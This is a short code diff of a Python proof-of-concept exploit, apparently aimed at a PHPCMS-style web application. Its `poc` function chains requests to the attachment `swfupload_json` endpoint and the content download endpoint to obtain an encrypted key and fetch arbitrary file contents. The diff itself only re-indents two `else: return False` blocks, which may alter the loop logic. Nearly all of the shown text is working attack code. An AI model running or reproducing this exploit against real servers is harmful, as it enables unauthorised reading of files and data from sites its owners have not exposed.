@@ -16,20 +16,21 @@ def poc(url):
             cookies[cookie_head + '_userid'] = c.value
             cookies[c.name] = c.value
             break
-    else:
-        return False
+        else:
+            return False
 
     step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
     for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
         if c.name[-9:] == '_att_json':
             enc_payload = c.value
             break
-    else:
-        return False
+        else:
+            return False
 
     setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
     r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
     return r.content
+
 
 class Exploit:
 
